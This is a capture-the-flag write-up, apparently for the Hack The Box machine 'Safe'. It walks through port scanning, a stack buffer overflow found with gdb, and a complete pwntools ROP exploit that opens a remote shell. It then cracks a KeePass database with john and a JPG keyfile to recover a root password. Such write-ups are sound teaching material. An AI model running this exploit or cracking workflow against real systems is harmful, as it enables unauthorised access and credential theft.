# Safe

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.1.173  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 04:43 EDT
Nmap scan report for 10.129.1.173
Host is up (0.0074s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

Might be a HTTP exploit here.

### Port 80 --> Binary&#x20;

Port 80 had nothing on it, just the default Apache2 page and no directories. However, it did contain this on the page source:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

Visiting `/myapp` would download an application to my machine.&#x20;

### Arbitrary Write BOF

Port 1337 seems to be running an application of some sorts:

<figure><img src="../../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

It was identical to the binary downloaded from port 80.&#x20;

```
$ ./myapp 
 04:46:50 up 56 min,  2 users,  load average: 0.38, 0.21, 0.19

What do you want me to echo back?
```

So this was a Buffer Overflow challenge! We probably need to exploit this binary to get a shell. Let's take a look at the `main` function of this binary in `ghidra`.&#x20;

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

This was obviously vulnerable to BOF. The most important thing is that `system` is used in the binary, **so we don't need to find the system function.** We can just use the existing one via ROP chaining.&#x20;

Let's analyse the binary and see the security protections enabled.&#x20;

{% code overflow="wrap" %}
```
$ file myapp             
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped

gdb-peda$ checksec myapp
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
{% endcode %}

NX is enabled, but ASLR isn't for the binary. As such, we can attempt some ROP attacks. I've done it a few times already, and if you want to find out more here I've written a page on it:

{% embed url="https://rouvin.gitbook.io/ibreakstuff/buffer-overflows/rop-chaining" %}

Let's first find the offset required. We can create a pattern length of 500 within `gdb` using `pattern create 500`.

> My preference is using GDB Peda, so the commands might be slightly different!

```
$ ./myapp 
 04:54:32 up  1:04,  2 users,  load average: 0.26, 0.20, 0.19

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A
zsh: segmentation fault  ./myapp
```

We can cause a segfault with an input of 500. Now, let's analyse the stack contents and see what is the offset required. First, we need to configure `gdb` to follow the parent process, since the `main` function executes `uptime`, which is another binary that `gdb` would end up following.

```
gdb-peda$ set follow-fork-mode parent
gdb-peda$ file myapp
Reading symbols from myapp...
(No debugging symbols found in myapp)
gdb-peda$ r
Starting program: /home/kali/htb/safe/myapp 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching after vfork from child process 20023]
 05:00:02 up  1:09,  2 users,  load average: 0.01, 0.10, 0.14

What do you want me to echo back?
```

Afterwards, enter our large input and check the first 8 characters of the stack values:

<figure><img src="../../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Now we can use `pattern query` to find the offset required:

```
gdb-peda$ pattern_offset jAA9AAOA
jAA9AAOA found at offset: 120
```

So we need 120 characters to overflow this thing. Now there are multiple ways to do this, either we go the Ret2Libc method by finding the `libc` library used via leaking the address of `puts` loaded in the binary, or we can write a string to the `.data` section of the binary.

I went with the latter as it's easier. We already have access to `system` and `gets`. We just need to find out where to write to. To find this, we can first start the process and then suspend it using CTRL + Z. Afterwards, check the PID number via `ps` and read `/proc/<ID>/maps` to see where we can write to:

```
$ ps                      
    PID TTY          TIME CMD
   2072 pts/5    00:00:01 zsh
  17999 pts/5    00:00:19 sublime_text
  18052 pts/5    00:00:00 plugin_host-3.3
  18055 pts/5    00:00:02 plugin_host-3.8
  32203 pts/5    00:00:00 myapp
  32218 pts/5    00:00:00 ps
$ cat /proc/32203/maps 
00400000-00401000 r--p 00000000 08:01 787675                             /home/kali/htb/safe/myapp
00401000-00402000 r-xp 00001000 08:01 787675                             /home/kali/htb/safe/myapp
00402000-00403000 r--p 00002000 08:01 787675                             /home/kali/htb/safe/myapp
00403000-00404000 r--p 00002000 08:01 787675                             /home/kali/htb/safe/myapp
00404000-00405000 rw-p 00003000 08:01 787675                             /home/kali/htb/safe/myapp
```

It appears the memory section from `0x404000 - 0x405000` is writeable, which is more than enough space to write `/bin/sh` to. Then, we can find the addresses of `gets` and `system` by disassembling the main function

```
gdb-peda$ disas main
call   0x401040 <system@plt>
call   0x401060 <gets@plt>
```

Then, we need a `pop rdi; ret` gadget to write to these sections. This can be found using `ropper`.

<pre><code><strong>$ ropper -f myapp
</strong>0x000000000040120b: pop rdi; ret; 
</code></pre>

Then, we can put this all together in one script and execute it to get a shell.

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./myapp',checksec=False)
#p = elf.process()
p = remote("10.129.1.173", 1337)

offset = 120
junk = b'A' * offset
gets = p64(0x401060)
sys = p64(0x401040)
pop_rdi = p64(0x40120b)
write = p64(0x404000)

payload = junk + pop_rdi + write + gets + pop_rdi + write + sys

p.recvline()
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
```

<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

Then, grab the user flag. We can upgrade our shell by putting our public key within the `authorized_keys` file.

## Privilege Escalation

### KeePass Brute Force

Within the user's directory, there is a KeePass database:

```
user@safe:~$ ls
IMG_0545.JPG  IMG_0547.JPG  IMG_0552.JPG  myapp             user.txt
IMG_0546.JPG  IMG_0548.JPG  IMG_0553.JPG  MyPasswords.kdbx
```

We can transfer all of this back to our machine for cracking. The database is obviously password encrypted, but `keepass2john` and `john` would work here.&#x20;

```
$ keepass2john pass.kdbx > hash
$ john --wordlist =/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bullshit         (pass)
```

Then, we can try to access this database, but find that we don't have the key for it.&#x20;

```
$ kpcli --kdb pass.kdbx        
Provide the master password: *************************
Couldn't load the file pass.kdbx

Error(s) from File::KeePass:
The database key appears invalid or else the database is corrupt.
```

Googling online, it appears that Keepass keys can literally be anything, even JPG files.&#x20;

{% embed url="https://sourceforge.net/p/keepass/discussion/329220/thread/2e189d15/" %}

So we can try each of the JPG files until one unlocks it. We can transfer the files over to my machien via `scp`.&#x20;

```
$ kpcli --key=IMG_0547.JPG --kdb pass.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
MyPasswords/
```

Then, we can just read the password for the `root` user.

```
kpcli:/MyPasswords> show -f 0

Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL: 
Notes: 

kpcli:/MyPasswords>
```

<figure><img src="../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

Rooted!
